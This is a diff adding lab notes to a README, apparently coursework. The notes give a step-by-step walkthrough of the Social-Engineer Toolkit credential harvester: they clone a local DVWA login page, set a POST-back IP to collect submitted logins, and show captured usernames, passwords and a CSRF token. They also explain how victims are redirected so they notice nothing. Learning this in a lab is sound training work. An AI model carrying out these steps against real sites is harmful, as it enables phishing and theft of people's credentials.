@@ -1,5 +1,66 @@
 # Web-cloning-and-SMB-social-engineering
+sudo setoolkit
 
+# Navigating to Web Attacks
+Select from the menu: 2
+Why: We choose "Website Attack Vectors" because we want to create a fake website
+
+# Choosing Attack Type
+
+set:webattack> 3
+Credential Harvester: Clones a real website and captures login credentials
+
+Other options: Java Applet, Metasploit Browser, Tabnabbing, Web Jacking, etc.
+
+# Selecting Cloning Method
+text
+set:webattack> 2
+Three Options:
+
+Web Templates: Pre-made fake login pages
+
+Site Cloner: Exact copy of any website (we chose this)
+
+Custom Import: Upload your own HTML file
+
+# Configuration Settings
+
+Enter the IP address for POST back in Harvester/Tabnabbing: 10.6.6.1
+Important: This must be your external/public IP if attacking over the internet
+
+Our case: We used local IP 10.6.6.1 for lab environment
+
+Why needed: Tells the fake site where to send captured credentials
+
+# Cloning Target Website
+text
+Enter the url to clone: http://dvwa.vm
+Target: DVWA (Damn Vulnerable Web Application) running locally
+
+Process: SET downloads all website files to create an identical copy
+
+Note: Works with both HTTP and HTTPS sites
+
+ How the Attack Works
+The Trap:
+Victim visits: User goes to our fake website (looks identical to real site)
+
+Enter credentials: User types username and password
+
+Capture happens: Instead of sending to real server, data goes to our SET server
+
+Redirect: User gets redirected to real site (so they don't suspect anything)
+
+What We Captured:
+POSSIBLE USERNAME FIELD FOUND: username=kali
+POSSIBLE PASSWORD FIELD FOUND: password=kali
+POSSIBLE USERNAME FIELD FOUND: Login=Login
+POSSIBLE USERNAME FIELD FOUND: user_token=513ea6844925da369b97d106b849a5de
+Credentials: Username kali and password kali
+
+Additional data: Login button text and CSRF token
+
+# SMB-social-engineering
 # Becoming Root
 ## sudo su
 Explanation: This command switches the user to root (superuser) to have necessary permissions for scanning and enumeration.
